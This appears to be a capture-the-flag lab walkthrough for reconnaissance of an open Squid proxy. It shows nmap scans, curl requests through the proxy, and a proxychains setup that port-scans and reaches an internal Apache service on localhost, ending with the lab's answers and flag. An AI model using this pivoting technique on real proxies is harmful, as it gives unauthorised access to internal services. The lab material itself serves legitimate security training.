#### 1. Squid Recon: Basics

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
1361: eth0@if1362: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
1364: eth1@if1365: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:05:f1:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.5.241.2/24 brd 192.5.241.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# nmap -sC -sV 192.5.241.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 01:46 UTC
Nmap scan report for 41yjq1z43li4u96hn8o3tcw8i.temp-network_a-5-241 (192.5.241.3)
Host is up (0.000015s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 02:42:C0:05:F1:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.72 seconds
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# curl -x 192.5.241.3:3128 127.0.0.1
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<meta type="copyright" content="Copyright (C) 1996-2015 The Squid Software Foundation and contributors">
<meta http-equiv="Content-Type" CONTENT="text/html; charset=utf-8">
<title>ERROR: The requested URL could not be retrieved</title>
<style type="text/css"><!--
 /*
 * Copyright (C) 1996-2015 The Squid Software Foundation and contributors
 *
 * Squid software is distributed under GPLv2+ license and includes
 * contributions from numerous individuals and organizations.
 * Please see the COPYING and CONTRIBUTORS files for details.
 */

/*
 Stylesheet for Squid Error pages
 Adapted from design by Free CSS Templates
 http://www.freecsstemplates.org
 Released for free under a Creative Commons Attribution 2.5 License
*/

/* Page basics */
* {
        font-family: verdana, sans-serif;
}

html body {
        margin: 0;
        padding: 0;
        background: #efefef;
        font-size: 12px;
        color: #1e1e1e;
}

/* Page displayed title area */
#titles {
        margin-left: 15px;
        padding: 10px;
        padding-left: 100px;
        background: url('/squid-internal-static/icons/SN.png') no-repeat left;
}

/* initial title */
#titles h1 {
        color: #000000;
}
#titles h2 {
        color: #000000;
}

/* special event: FTP success page titles */
#titles ftpsuccess {
        background-color:#00ff00;
        width:100%;
}

/* Page displayed body content area */
#content {
        padding: 10px;
        background: #ffffff;
}

/* General text */
p {
}

/* error brief description */
#error p {
}

/* some data which may have caused the problem */
#data {
}

/* the error message received from the system or other software */
#sysmsg {
}

pre {
    font-family:sans-serif;
}

/* special event: FTP / Gopher directory listing */
#dirmsg {
    font-family: courier;
    color: black;
    font-size: 10pt;
}
#dirlisting {
    margin-left: 2%;
    margin-right: 2%;
}
#dirlisting tr.entry td.icon,td.filename,td.size,td.date {
    border-bottom: groove;
}
#dirlisting td.size {
    width: 50px;
    text-align: right;
    padding-right: 5px;
}

/* horizontal lines */
hr {
        margin: 0;
}

/* page displayed footer area */
#footer {
        font-size: 9px;
        padding-left: 10px;
}


body
:lang(fa) { direction: rtl; font-size: 100%; font-family: Tahoma, Roya, sans-serif; float: right; }
:lang(he) { direction: rtl; }
 --></style>
</head><body id=ERR_CONNECT_FAIL>
<div id="titles">
<h1>ERROR</h1>
<h2>The requested URL could not be retrieved</h2>
</div>
<hr>

<div id="content">
<p>The following error was encountered while trying to retrieve the URL: <a href="http://127.0.0.1/">http://127.0.0.1/</a></p>

<blockquote id="error">
<p><b>Connection to 127.0.0.1 failed.</b></p>
</blockquote>

<p id="sysmsg">The system returned: <i>(111) Connection refused</i></p>

<p>The remote host or network may be down. Please try the request again.</p>

<p>Your cache administrator is <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_CONNECT_FAIL&amp;body=CacheHost%3A%20victim-1%0D%0AErrPage%3A%20ERR_CONNECT_FAIL%0D%0AErr%3A%20(111)%20Connection%20refused%0D%0ATimeStamp%3A%20Mon,%2005%20Aug%202019%2001%3A48%3A25%20GMT%0D%0A%0D%0AClientIP%3A%20192.5.241.2%0D%0AServerIP%3A%20127.0.0.1%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F7.61.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20127.0.0.1%0D%0A%0D%0A%0D%0A">webmaster</a>.</p>

<br>
</div>

<hr>
<div id="footer">
<p>Generated Mon, 05 Aug 2019 01:48:25 GMT by victim-1 (squid/3.5.12)</p>
<!-- ERR_CONNECT_FAIL -->
</div>
</body></html>
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# tail -2 /etc/proxychains.conf
# socks4        127.0.0.1 9050
http 192.5.241.3 3128
root@attackdefense:~#
```

```sh
root@attackdefense:~# proxychains nmap -sV -sT -p- 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 01:57 UTC
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:139-<--denied
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:110-<--denied
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:53-<--denied
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:445-<--denied
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:3306-<--denied
<----SNIP---->
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:1337-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:1337-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:1337-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:3128-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:1337-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:1337-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:1337-<><>-OK
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:3128-<><>-OK
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00096s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE    VERSION
1337/tcp open  http       Apache httpd 2.4.18 ((Ubuntu))
3128/tcp open  http-proxy Squid http proxy 3.5.12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.50 seconds
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# curl -x 192.5.241.3:3128 127.0.0.1:1337
84b321a74d69045cf4ff0270ea7ad4e5
root@attackdefense:~#
```

```sh
root@attackdefense:~# proxychains curl 127.0.0.1:1337
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-192.5.241.3:3128-<><>-127.0.0.1:1337-<><>-OK
84b321a74d69045cf4ff0270ea7ad4e5
root@attackdefense:~#
```

----

###### Questions

- Find the version of Squid proxy.

```
# nmap -sC -sV 192.5.241.3
3.5.12
```

- Is the Squid proxy using open authentication.

```
# curl -x 192.5.241.3:3128 127.0.0.1
Yes
```

- On which port is Apache service listening locally?

```
# tail -2 /etc/proxychains.conf
# proxychains nmap -sV -sT -p- 127.0.0.1
1337
```

- Get the flag from the web server running locally on the proxy server.

```
# curl -x 192.5.241.3:3128 127.0.0.1:1337
# proxychains curl 127.0.0.1:1337
84b321a74d69045cf4ff0270ea7ad4e5
```

----

EOF